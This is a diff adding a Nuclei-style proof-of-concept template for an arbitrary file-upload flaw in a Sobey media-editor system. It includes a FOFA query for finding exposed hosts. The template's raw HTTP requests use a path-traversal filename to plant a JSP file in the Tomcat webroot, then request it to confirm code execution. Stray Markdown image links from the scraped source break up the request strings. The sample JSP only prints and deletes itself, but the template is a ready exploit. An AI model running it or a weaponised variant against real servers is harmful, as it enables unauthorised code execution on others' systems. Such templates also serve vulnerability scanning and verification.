@@ -1,0 +1,62 @@
+id: poc-yb2xs827b1lf63sc
+info:
+  name: 索贝融媒体系统Upload存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yb2xs827b1lf63sc'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yb2xs827b1lf63sc
+    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+http:
+- raw:
+  - 'POST /sobey-mchEditor/watermark/upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN
+
+    Connection: keep-alive
+
+    Content-Length: 350
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2MPk8DnbXZiTAx15
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
+
+
+    ------WebKitFormBoundary2MPk8DnbXZiTAx15
+
+    Content-Disposition: form-data; name="file"; filename="../../../../../../../../../usr/local/tomcat/webapps/sobey-mchEditor/123.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("test"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundary2MPk8DnbXZiTAx15--
+
+    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762078880990-b056eb84-4e75-4fff-bf2e-7eb36116c680.png)
+
+    **访问**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /sobey-mchEditor/123.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1762078881457-74bfdf38-17ca-48f2-a252-194fa0a9c574.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
